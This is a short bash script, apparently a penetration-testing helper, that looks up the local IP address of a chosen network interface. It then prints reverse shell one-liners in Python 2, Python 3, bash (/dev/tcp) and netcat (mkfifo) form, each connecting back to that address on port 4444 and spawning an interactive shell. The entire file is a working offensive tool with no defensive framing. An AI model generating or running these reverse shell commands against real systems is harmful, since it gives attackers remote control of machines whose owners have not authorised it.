#!/bin/bash

if [ $# -lt 2 ] ;then
	echo "[+] usage: ./revshe.sh interface shell_type"
	echo '	iterface:eth0,tun0'
	echo '	python,bash,netcat'
else
	face=$1
	uslov=$(ip -f inet addr show $face 2>&1)
	shell=$2
	if [[ $uslov == *"does not exist."* ]];then
		echo "pls enter valid interface on your machine"
		exit
	fi
	address=$(ip -f inet addr show $face | grep -Po "inet \K[\d.]+");	
	case $shell in 
		python2|py2)
			echo "python shell"
			echo " python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$address\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

			;;
		python3|py3|python|py)
			echo "python shell"
			echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$address\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
			;;
		bash|sh)
			echo "bash shell"
			echo "bash -c 'bash -i >& /dev/tcp/$address/4444 0>&1'"
			;;
		nc|netcat|ncat)
			echo "nc shell"
			echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $address 4444 >/tmp/f"
	esac

fi
